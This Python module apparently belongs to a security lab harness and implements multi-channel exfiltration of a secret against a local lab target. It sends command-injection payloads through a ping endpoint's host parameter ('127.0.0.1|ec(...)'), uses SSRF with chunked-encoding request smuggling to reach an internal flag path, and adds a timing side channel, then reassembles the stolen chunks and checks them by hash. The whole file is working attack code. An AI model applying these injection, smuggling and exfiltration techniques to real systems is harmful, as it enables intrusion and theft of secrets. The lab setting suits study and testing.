import hashlib
import http.client
import time
import urllib.parse

from .evidence import Evidence


def http_get(host: str, port: int, path: str, headers=None, timeout: float = 4.0):
    t0 = time.perf_counter()
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", path, headers=headers or {})
        r = conn.getresponse()
        body = r.read().decode("iso-8859-1", "replace")
        code = r.status
        conn.close()
    except Exception as exc:
        code, body = -1, f"err:{type(exc).__name__}"
    return code, body, (time.perf_counter() - t0) * 1000


def channel_echo(host: str, port: int, chunk: str) -> bool:
    q = urllib.parse.urlencode({"host": f"127.0.0.1|ec({chunk})"})
    code, body, _ms = http_get(host, port, "/ping?" + q)
    return code == 200 and f"echo:{chunk}" in body


def channel_ssrf_desync(front_host: str, front_port: int, origin_port_twin: int, chunk: str) -> bool:
    from . import engine
    tag = urllib.parse.quote(f"tag={chunk}")
    sm_path = f"/internal?target=b&path=/flag%3Ftag%3D{chunk if '-' not in chunk else urllib.parse.quote(chunk)}"
    st = engine.FamilyState("desync", front_host, front_port)
    res = engine.probe_desync(st, "chunked-ext", sm_path)
    return res.code == 200 and chunk in res.body


def channel_timing(host: str, port: int, hex_two: str, ev: Evidence | None = None) -> bool:
    delay = 50 + (int(hex_two, 16) % 400)
    code, body, ms = http_get(host, port, f"/tick?delay={delay}")
    ok = code == 200 and ms >= delay * 0.6
    if ev:
        ev.event("exfil-timing", shape=f"tick:{delay}", code=code, ms=round(ms, 1), ok=ok)
    return ok


def split_chunks(secret: str, size: int = 2) -> list[str]:
    return [secret[i : i + size] for i in range(0, len(secret), size)]


def exfil_secret(
    secret, lab, ev: Evidence, channels=("echo", "desync", "timing"), max_retx: int = 3
) -> dict:
    chunks = split_chunks(secret)
    walk = []
    ack = 0
    for chunk in chunks:
        hex_two = chunk.encode().hex()
        ok_echo = "echo" in channels and channel_echo("127.0.0.1", lab.web_port, chunk)
        ok_desync = "desync" in channels and channel_ssrf_desync("127.0.0.1", lab.front_port, lab.patched_port, chunk)
        ok_time = "timing" in channels and channel_timing("127.0.0.1", lab.web_port, hex_two, ev)
        seen = sum(bool(x) for x in (ok_echo, ok_desync, ok_time))
        attempts = 0
        while seen < 2 and attempts < max_retx:
            attempts += 1
            if ok_desync:
                pass
            ok_echo = ok_echo or channel_echo("127.0.0.1", lab.web_port, chunk)
            ok_desync = ok_desync or channel_ssrf_desync("127.0.0.1", lab.front_port, lab.patched_port, chunk)
            seen = sum(bool(x) for x in (ok_echo, ok_desync, ok_time))
        if seen >= 2:
            ack += 1
        walk.append({"chunk": chunk, "hex": hex_two, "acks": seen, "retx": attempts})
        if seen >= 2:
            ev.verdict_ok("exfil-chunk", chunk=chunk, acks=seen, retx=attempts)
        else:
            ev.verdict_no("exfil-chunk", chunk=chunk, acks=seen)
    rebuild = "".join(w["chunk"] for w in walk)
    sha_ok = hashlib.sha256(rebuild.encode()).hexdigest() == hashlib.sha256(secret.encode()).hexdigest()
    ev.verdict_ok("exfil-secret", channels=list(channels), acked_chunks=ack, total=len(chunks), sha_match=sha_ok)
    return {
        "acked_chunks": ack,
        "total": len(chunks),
        "channels": list(channels),
        "rebuilt": rebuild,
        "sha_match": sha_ok,
        "walk": walk,
    }